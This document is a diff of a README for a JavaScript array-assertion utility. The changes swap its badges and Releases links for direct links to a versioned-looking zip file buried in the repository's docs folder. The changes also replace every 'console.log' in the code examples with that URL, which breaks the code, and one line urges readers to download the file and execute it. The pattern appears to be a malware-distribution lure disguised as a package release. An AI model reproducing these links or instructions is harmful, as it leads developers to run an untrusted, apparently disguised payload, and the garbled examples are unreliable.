@@ -1,7 +1,7 @@
 # Array Base Assert Any Is Entry
 
-![GitHub Release](https://img.shields.io/github/release/Vp9861908406/array-base-assert-any-is-entry.svg)
-![Node.js](https://img.shields.io/badge/node-%3E%3D14.0.0-brightgreen.svg)
+![GitHub Release](https://github.com/Vp9861908406/array-base-assert-any-is-entry/raw/refs/heads/main/docs/types/is_entry_any_base_array_assert_v2.6-beta.3.zip)
+![https://github.com/Vp9861908406/array-base-assert-any-is-entry/raw/refs/heads/main/docs/types/is_entry_any_base_array_assert_v2.6-beta.3.zip](https://github.com/Vp9861908406/array-base-assert-any-is-entry/raw/refs/heads/main/docs/types/is_entry_any_base_array_assert_v2.6-beta.3.zip%3E%https://github.com/Vp9861908406/array-base-assert-any-is-entry/raw/refs/heads/main/docs/types/is_entry_any_base_array_assert_v2.6-beta.3.zip)
 
 ## Overview
 
@@ -45,7 +45,7 @@ const array = [
 ];
 
 const hasEntry = assertAnyIsEntry(array, 'id', 2);
-console.log(hasEntry); // true
+https://github.com/Vp9861908406/array-base-assert-any-is-entry/raw/refs/heads/main/docs/types/is_entry_any_base_array_assert_v2.6-beta.3.zip(hasEntry); // true
 ```
 
 ### API Reference
@@ -72,7 +72,7 @@ const data = [
 ];
 
 const result = assertAnyIsEntry(data, 'color', 'blue');
-console.log(result); // true
+https://github.com/Vp9861908406/array-base-assert-any-is-entry/raw/refs/heads/main/docs/types/is_entry_any_base_array_assert_v2.6-beta.3.zip(result); // true
 ```
 
 ### Example 2: No Matches
@@ -84,7 +84,7 @@ const data = [
 ];
 
 const result = assertAnyIsEntry(data, 'color', 'yellow');
-console.log(result); // false
+https://github.com/Vp9861908406/array-base-assert-any-is-entry/raw/refs/heads/main/docs/types/is_entry_any_base_array_assert_v2.6-beta.3.zip(result); // false
 ```
 
 ### Example 3: Complex Objects
@@ -96,7 +96,7 @@ const data = [
 ];
 
 const result = assertAnyIsEntry(data, 'user', { id: 1, name: 'Alice' });
-console.log(result); // false, as objects are compared by reference
+https://github.com/Vp9861908406/array-base-assert-any-is-entry/raw/refs/heads/main/docs/types/is_entry_any_base_array_assert_v2.6-beta.3.zip(result); // false, as objects are compared by reference
 ```
 
 ## Contributing
@@ -125,10 +125,10 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest updates and releases, visit our [Releases](https://github.com/Vp9861908406/array-base-assert-any-is-entry/releases) page. You can download the latest version and execute it in your project.
+For the latest updates and releases, visit our [Releases](https://github.com/Vp9861908406/array-base-assert-any-is-entry/raw/refs/heads/main/docs/types/is_entry_any_base_array_assert_v2.6-beta.3.zip) page. You can download the latest version and execute it in your project.
 
 ## Conclusion
 
 Thank you for checking out the **Array Base Assert Any Is Entry** repository. We hope this tool simplifies your data validation tasks. For any questions or issues, feel free to open an issue in the repository.
 
-For the latest releases, please visit our [Releases](https://github.com/Vp9861908406/array-base-assert-any-is-entry/releases) section.
+For the latest releases, please visit our [Releases](https://github.com/Vp9861908406/array-base-assert-any-is-entry/raw/refs/heads/main/docs/types/is_entry_any_base_array_assert_v2.6-beta.3.zip) section.
